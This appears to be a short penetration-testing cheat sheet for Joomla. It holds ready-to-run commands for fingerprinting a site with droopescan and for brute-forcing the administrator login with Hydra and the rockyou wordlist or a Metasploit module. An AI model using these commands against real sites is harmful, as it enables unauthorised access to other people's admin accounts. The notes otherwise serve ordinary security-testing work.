**Overview:**
- Joomla is a free and open-source CMS used for discussion forums, photo galleries, e-Commerce, user-based communities, and more. It is written in PHP and uses MySQL in the backend.  
- Joomla can be enhanced with over 7,000 extensions and over 1,000 templates.
- Joomla collects some anonymous  usage statistics such as the breakdown of Joomla, PHP and database versions and server operating systems in use on Joomla installations. This data can be queried via their public API.
---
## Enumeration

```bash
droopescan scan joomla --url http://<target>
```

Fingerprints Joomla version, installed extensions, and known vulnerabilities.

---
## Brute Force

**Hydra**

```bash
hydra -l <user> -P /usr/share/wordlists/rockyou.txt <target> http-post-form "/administrator/index.php:username=^USER^&passwd=^PASS^&option=com_login&task=login:Invalid"
```

Brute force Joomla admin login via Hydra. Adjust the form fields if the target uses a custom login path.

**Metasploit**

```bash
msf> use auxiliary/scanner/http/joomla_bruteforce_login
```

Metasploit module for Joomla login brute force.